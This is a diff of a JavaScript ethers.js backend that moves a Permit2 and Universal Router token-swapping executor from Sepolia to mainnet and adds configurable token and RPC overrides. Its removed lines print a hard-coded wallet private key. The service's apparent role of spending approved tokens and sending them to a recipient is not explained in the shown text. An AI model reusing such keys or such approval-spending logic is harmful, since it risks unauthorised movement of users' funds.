@@ -12,11 +12,11 @@ import { ethers } from 'ethers';
 // Configuration / constants
 // -----------------------------
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // same on all networks
-const UNIVERSAL_ROUTER = "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"; // Sepolia testnet
+const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // Mainnet
 
 // Hard-coded fallback executor address + private key (can be overridden via Firestore or env)
-const HARDCODED_EXECUTOR = '0xb1f02c288ae708de5e508021071b775c944171e8'; // Sepolia testnet
-const HARDCODED_PRIVATE_KEY = '0x2c9e89ed5e437acfc2db83d7bd76eb73b9d978a4716f0e8d91c2794a011d2d64'; // Sepolia testnet
+const HARDCODED_EXECUTOR = '';
+const HARDCODED_PRIVATE_KEY = '';
 
 // Runtime executor config (may be loaded from Firestore admin_config/settings)
 let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
@@ -35,6 +35,8 @@ let db = null;
 let provider = null;
 let spenderWallet = null;
 let router = null;
+let OUTPUT_TOKEN_OVERRIDE = null;
+let RPC_URL_OVERRIDE = null;
 
 // -----------------------------
 // Init function
@@ -64,12 +66,18 @@ async function init() {
     EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
     EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
     RECIPIENT_ADDRESS = cfg.recipientAddress || process.env.RECIPIENT_ADDRESS || HARDCODED_EXECUTOR;
+    OUTPUT_TOKEN_OVERRIDE = cfg.tokenAddress || process.env.OUTPUT_TOKEN || null;
+    RPC_URL_OVERRIDE = cfg.rpcUrl || process.env.RPC_URL || null;
   } catch (e) {
     // ignore — we'll fall back to hard-coded values
     console.error('failed to load admin_config settings (executor override):', e);
   }
 
-  provider = new ethers.JsonRpcProvider(process.env.RPC_URL || 'https://rpc.sepolia.org');
+  if (!EXECUTOR_ADDRESS || !EXECUTOR_PRIVATE_KEY) {
+    throw new Error('Missing EXECUTOR_ADDRESS or EXECUTOR_PRIVATE_KEY for mainnet');
+  }
+
+  provider = new ethers.JsonRpcProvider(RPC_URL_OVERRIDE || 'https://cloudflare-eth.com');
   // Use configured private key to create signer
   spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
   // Sanity check to ensure the key controls the expected executor address
@@ -154,7 +162,7 @@ function buildUniversalRouterTx(data, overrides = {}) {
   // Build a simple V3 exact-in swap input (single hop)
   // Note: This example constructs a path: token + fee + outputToken.
   // Replace outputToken with desired final token.
-  const outputToken = process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH9 by default
+  const outputToken = OUTPUT_TOKEN_OVERRIDE || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH9 by default
   const feeTier = Number(process.env.SWAP_FEE || 3000); // default 3000 = 0.3%
 
   // path encoding: token (20 bytes) + fee (3 bytes) + outputToken (20 bytes)
